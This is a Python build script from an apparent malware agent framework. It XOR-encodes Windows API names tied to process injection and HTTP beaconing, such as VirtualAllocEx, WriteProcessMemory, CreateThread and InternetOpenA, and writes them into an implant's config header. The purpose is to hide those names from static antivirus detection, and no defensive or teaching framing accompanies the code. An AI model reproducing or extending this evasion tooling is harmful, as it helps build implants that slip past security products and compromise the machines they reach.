## Build File, for agent specific build items
import random
import os
import logging

## give a logger here
# replace names to be the local path

"""
Individual Patch Script for binary

TLDR: Use this for custom edits on the binary at build. If this file is present, it will
call the ___ class, init it, and call the .build() method.

This is to maintain compatability with all binaries in the make system, so it just calls the CMAKE build, and 
no need for extra custom implementation stuff. 


"""


class Configure:

    def __init__(self, base_build_path):
        """
        Project Root: Root of agent project, ex data/agent_templates/myagent/

        """

        self.base_build_path = base_build_path
        self.config_file = (
            base_build_path / "whisper_config.h"
        )  # Put your config.h here

        self._setup_logger()

    def _setup_logger(self):
        """
        Setups a logger, doing within function so the file ends up in the build directory.
        Otherwise, it ends up in outputting wherever the project was called from.

        """
        LOG_FILE = self.base_build_path / "config.log"
        LOG_FORMAT = "%(asctime)s - %(levelname)s - %(message)s"

        logging.basicConfig(
            filename=LOG_FILE, filemode="a", format=LOG_FORMAT, level=logging.DEBUG
        )
        self.logger = logging.getLogger("configure")

    def configure(self):
        """
        Func to do everything

        """
        self.logger.info(f"Configuring for {self.base_build_path}")
        self.macro_replace_xor_function_names()

    def macro_replace_xor_function_names(self):
        """Perform macro replacements in the header file using the build system."""
        self.logger.info("Performing macro replacements in whisper_config.h")

        file_path = self.config_file

        # Define function names
        # note, have to do this manually for now
        function_names = [
            "MessageBoxA",
            "CreateThread",
            "ResumeThread",
            "VirtualAllocEx",
            "WriteProcessMemory",
            "CreatePipe",
            "SetHandleInformation",
            "CloseHandle",
            "InternetOpenA",
            "InternetConnectA",
            "HttpOpenRequestA",
            "HttpSendRequestA",
            "InternetOpenUrlW",
            "InternetReadFile",
            "InternetCloseHandle",
            "GetUserNameW",
            "Sleep",
            "WaitForSingleObject",
            "ReadFile",
            "MessageBoxA",
            "CreateThread",
        ]

        # Define XOR key in binary format
        FUNC_ENCRYPTED_NAME_KEY = b"\xDE"  # Fixed binary XOR key

        # Define replacements dynamically
        macro_replacements = {
            "MACRO_FUNC_ENCRYPTED_NAME_KEY": f"0x{FUNC_ENCRYPTED_NAME_KEY.hex().upper()}",
        }

        print(f"XOR Key Used for Encryption: {FUNC_ENCRYPTED_NAME_KEY.hex().upper()}")

        for func in function_names:
            encrypted_array = self.xor_obfuscate_to_c_array(
                func, FUNC_ENCRYPTED_NAME_KEY
            )
            macro_replacements[f"MACRO_FUNC_{func}_ENCRYPTED_NAME"] = encrypted_array
            print(f"Replacing MACRO_FUNC_{func}_ENCRYPTED_NAME with {encrypted_array}")

        # Read and replace the macros in the header file (binary safe)
        try:
            if not file_path.exists():
                self.logger.warning(f"Config file {file_path} does not exist!")
                return

            with open(file_path, "r+", encoding="utf-8") as file:
                contents = file.read()

                # Ensure replacements actually happen
                modified_contents = contents
                for macro, value in macro_replacements.items():
                    if macro in modified_contents:
                        self.logger.info(
                            f"Replacing {macro} with {value} in {file_path}"
                        )
                        modified_contents = modified_contents.replace(macro, value)
                    else:
                        print(f"Macro {macro} not found in {file_path}")

                # Only write if changes were made
                if modified_contents != contents:
                    file.seek(0)
                    file.write(modified_contents)
                    file.truncate()
                    self.logger.info(f"Successfully updated {file_path}")
                else:
                    self.logger.warning(f"No replacements were made in {file_path}")

        except FileNotFoundError:
            self.logger.info(f"File {file_path} not found. Skipping.")
        except IOError as e:
            self.logger.error(f"File write error on {file_path}: {e}")
        except Exception as e:
            self.logger.critical(f"Error processing {file_path}: {e}")

    def xor_obfuscate_to_c_array(self, input_string: str, key: bytes):
        """
        XOR-obfuscate function name using a binary XOR key and return a properly formatted C-style hex array.

        :param input_string: The function name to encrypt.
        :param key: A single-byte `bytes` object (e.g., b'\xDE').
        :return: A formatted C-style array string (e.g., "{ 0x5D, 0x75, 0x63, 0x63, 0x71, 0x00 }").
        """
        if not isinstance(key, bytes) or len(key) != 1:
            raise TypeError(
                f"XOR key must be a single-byte `bytes`, got {type(key).__name__}: {key}"
            )

        key_byte = key[0]  # Extract actual byte value (integer)
        input_bytes = input_string.encode("utf-8")  # Convert to raw bytes

        # XOR each byte and convert to hex format
        obfuscated = [f"0x{b ^ key_byte:02X}" for b in input_bytes]

        # Ensure proper null termination
        obfuscated.append("0x00")

        result = "{ " + ", ".join(obfuscated) + " };"

        # Debugging
        self.logger.info(f"[DEBUG] XOR Key: {key.hex().upper()}")
        self.logger.info(f"[DEBUG] Input Bytes: {input_bytes.hex().upper()}")
        self.logger.info(f"[DEBUG] Obfuscated Output: {result}")

        return result

    def generate_xor_key(self, length=1):
        """
        Generate a random XOR key of the specified length as a hex integer.

        - If `length=1`, returns an integer in hex format (e.g., 0x3F).
        - If `length>1`, returns a list of hex integers (e.g., [0x3F, 0xA2, 0xC1]).

        The key avoids null bytes (0x00) to ensure proper encryption.

        :param length: Length of the XOR key (default: 1)
        :return: An integer (if length=1) or a list of hex integers (if length > 1)
        """
        if length < 1:
            raise ValueError("XOR key length must be at least 1")

        key = os.urandom(length)
        key = [b if b != 0 else random.randint(1, 255) for b in key]  # Avoid 0x00

        if length == 1:
            return key[0]  # Return as int (e.g., 0x3F)
        return key  # Return as list of hex values (e.g., [0x3F, 0xA2, 0xC1])
